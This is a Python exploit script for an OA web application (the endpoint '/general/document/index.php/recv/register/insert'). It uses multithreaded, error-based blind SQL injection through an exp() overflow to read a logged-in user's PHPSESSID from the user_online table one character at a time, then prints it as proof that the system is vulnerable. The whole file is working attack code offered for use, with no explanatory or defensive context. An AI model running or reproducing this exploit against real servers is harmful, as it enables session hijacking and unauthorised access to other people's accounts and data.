#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec


import requests
import urllib3
import sys
import json
import re
import _thread
import time
requests.packages.urllib3.disable_warnings()

UNAME_length = 26
USERUID = []

header = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.125 Safari/537.36',"Content-Type":"application/x-www-form-urlencoded",'Connection':'close'}

def get_url(url,num,uid):
    global UNAME_length
    global USERUID

    litgh = 48
    right = 120
    tmp = 0
    while litgh <= right:
        mid = int((litgh+right)/2)
        if tmp == mid:
            break
        else: tmp = mid
        flag = run_payload(url,uid,num,mid)
        if flag:
            litgh = mid
        else:
            right = mid
    USERUID[num-1] = chr(mid)
    #print("session: ",num,chr(mid))

def run_payload(url,uid,num,mid):
    try:
        payload =f"""title)values("'"^exp(if(ascii(substr((select/**/SID/**/from/**/user_online/**/limit/**/{uid},1),{num},1))>%3d{mid},1,710)))# =1&_SERVER="""
        req = requests.post(url, headers=header, data=payload,verify=False,timeout=20,allow_redirects=False)
        if req.status_code == 302:
            return True
        elif req.status_code == 500:
            return False
        elif req.status_code != 500:
            return run_payload(url,uid,num,mid)
    except Exception as e:
        return run_payload(url,uid,num,mid)

def get_phpsessid(url,uid):
    USERUID.clear()
    [USERUID.append("") for one in range(0,UNAME_length)]
    for num in range(1,UNAME_length+1):
        _thread.start_new_thread(get_url, (url,num,uid,)) # 多线程

    tmp = 0
    while 1: # 等待跑完26位session id

        flag = 0
        for num in range(0,len(USERUID)):
            if USERUID[num] != '':
                flag += 1
        uname = ""
        for num in range(0,len(USERUID)):
            uname += str(USERUID[num])
        #if flag != tmp:
        #    print(f"已完成: {flag}/{UNAME_length}  SID:{uname}  {USERUID} ")

        tmp = flag
        if flag == UNAME_length:
            break
    time.sleep(0.5)
    return uname

if __name__=="__main__":
    site = sys.argv[1]
    url = site + "/general/document/index.php/recv/register/insert"
    #print(url)
    uid=1 # 获取第几个用户的session
    phpsessid = get_phpsessid(url,uid-1)
    if phpsessid != "": 
        print("漏洞存在，PHPSESSID = ",phpsessid)
    else:
        print("漏洞不存在")

 
